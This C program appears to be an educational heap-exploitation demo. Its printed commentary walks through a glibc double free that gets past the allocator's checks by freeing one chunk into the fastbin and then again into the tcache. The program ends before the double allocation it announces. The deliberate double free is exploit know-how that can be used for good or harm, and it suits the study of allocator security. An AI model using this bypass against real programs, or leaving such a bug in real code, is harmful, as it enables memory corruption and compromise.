#include <stdio.h>
#include <stdlib.h>

#define CHUNK_SIZE0 0x70

void main() {
    long *chunk0,
            *chunk1,
            *chunk2,
            *chunk3,
            *chunk4,
            *chunk5,
            *chunk6,
            *chunk7,
            *chunk8;

    printf("So, we will now execute a double free, bypassing the checks in place.\n");
    printf("Both the tcache and the fastbin have checks in place, in order to detect double frees.\n");
    printf("However the fastbin double free check only works for if the chunk has been inserted into the fastbin.\n");
    printf("If the chunk has been inserted into a different bin, it won't have a chance to detect a double free (there are other ways to bypass it).\n");
    printf("It works similarly with the tcache, where it can't detect freed chunks in other bins.\n");
    printf("As such, we will free a chunk twice via inserting it into the fastbin first, then into the tcache.\n");
    printf("Let's allocate our chunks!\n\n");

    chunk0 = malloc(CHUNK_SIZE0);
    chunk1 = malloc(CHUNK_SIZE0);
    chunk2 = malloc(CHUNK_SIZE0);
    chunk3 = malloc(CHUNK_SIZE0);
    chunk4 = malloc(CHUNK_SIZE0);
    chunk5 = malloc(CHUNK_SIZE0);
    chunk6 = malloc(CHUNK_SIZE0);
    chunk7 = malloc(CHUNK_SIZE0);
    malloc(CHUNK_SIZE0);

    printf("Since we are inserting chunks into the fastbin, we need to fill up the corresponding tcache bin first.\n");
    printf("Let's go ahead and fill up the tcache bin, and insert a chunk into the fastbin!\n\n");

    free(chunk0);
    free(chunk1);
    free(chunk2);
    free(chunk3);
    free(chunk4);
    free(chunk5);
    free(chunk6);
    free(chunk7);

    printf("Now let's go ahead and allocate a chunk from the tcache to make space for the %p chunk!\n\n", chunk7);

    malloc(CHUNK_SIZE0);

    printf("Now let's free our %p chunk again, to insert it into the tcache, and execute a double free!\n\n", chunk7);

    free(chunk7);

    printf("Now that we've inserted the same chunk into both the fastbin and tcache, let's allocate it twice!\n");
    printf("Now by inserting it into the tcache too, we've changed the next ptr of the fastbin.\n");
    printf("Depending on what happens, this can cause problems.\n");
}


